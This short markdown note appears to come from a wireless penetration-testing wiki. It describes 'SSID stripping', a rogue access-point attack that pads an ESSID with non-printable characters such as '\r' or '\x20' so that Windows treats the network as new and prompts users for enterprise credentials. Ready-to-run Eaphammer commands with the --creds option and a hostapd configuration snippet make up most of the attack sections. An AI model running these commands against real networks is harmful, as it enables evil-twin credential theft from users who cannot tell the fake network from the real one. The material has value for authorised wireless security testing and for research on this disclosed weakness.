# ESSID Stripping

Add a non-printable UTF8 character to the AP ESSID to avoid new security settings on WiFi clients, such as Microsoft. This security configuration stores the information of the old connections and notifies if there are any changes, blocking the automatic connections and not allowing access to the network. In addition, the user's credentials could be obtained in case the computer uses client certificate or computer credentials in the domain, because for Windows is a new network.

With this attack, the AP name is the same for the client, but Windows detects the full name as a new one, as it sees the non-printable characters. Then, the client asks for the username, password, etc. when logging in. Like a new network.


The options are:
- '\r' for a new line.
- '\t' for a tab.
- '\n' for a enter, like '\r'.
- '\x20' for a space, like adding a white space after the SSID option using quotes.


## Attacking with original Eaphammer (only space)

```bash
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid "wifi-AP " --creds --negotiate balanced
```

## Attacking with modified Eaphammer

An example using the  `--stripping '\r'`  parameter is shown below. In this case we use '\r' because is not showed by Android and it may go unnoticed as a new line in Windows, Linux and iOS.


```bash
python3 ./eaphammer -i wlan0 --auth wpa-eap --essid wifi-AP --creds --negotiate balanced --essid-stripping '\r'
```

## Attacking manually using hostapd

We only have to use the UTF8 essid options, and use the P options in the essid2 in the hostapd.conf file:
``` bash
ssid2=P"wifi-AP\x20"
utf8_ssid=1
```

# Refs

- https://aireye.tech/2021/09/13/the-ssid-stripping-vulnerability-when-you-dont-see-what-you-get/

- https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf
